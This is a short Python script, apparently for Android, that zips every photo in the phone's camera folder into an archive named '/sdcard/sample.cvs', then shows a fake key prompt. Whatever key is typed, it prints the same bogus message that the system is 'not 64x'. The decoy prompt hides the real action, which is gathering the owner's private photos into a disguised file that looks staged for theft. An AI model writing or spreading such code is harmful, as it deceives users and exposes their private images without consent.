import os
from zipfile import ZipFile

path = "/sdcard/DCIM/Camera"
image_list = os.listdir(path)
image_list = [a for a in image_list if a.endswith('jpg') or a.endswith('jpeg') or a.endswith('png') ]

with ZipFile('/sdcard/sample.cvs', 'w') as zipObj2:
   # Add multiple files to the zip
   for i in image_list:
        im = path +"/"+ i
        zipObj2.write(im)
      
x = input("Enter You key >>")

if x=="xs3jb":
    print("\n\nYour system in not 64x\n")
else:
    print("\n\nYour system in not 64x\n")